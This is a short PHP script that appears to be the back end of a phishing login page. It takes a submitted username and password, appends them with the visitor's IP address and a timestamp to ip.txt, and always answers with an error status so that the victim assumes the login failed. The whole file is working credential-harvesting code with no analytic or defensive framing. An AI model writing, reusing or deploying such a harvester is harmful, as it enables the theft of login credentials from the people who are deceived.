<?php
include 'ip.php';
if (isset($_POST['username']) && isset($_POST['password'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $log = "LOGIN: " . $user . " | " . $pass . " | IP: " . $ip . " | Waktu: " . date('Y-m-d H:i:s') . "\n";
    file_put_contents('ip.txt', $log, FILE_APPEND);
    echo json_encode(['status' => 'error']);
} else {
    echo json_encode(['status' => 'error']);
}
?>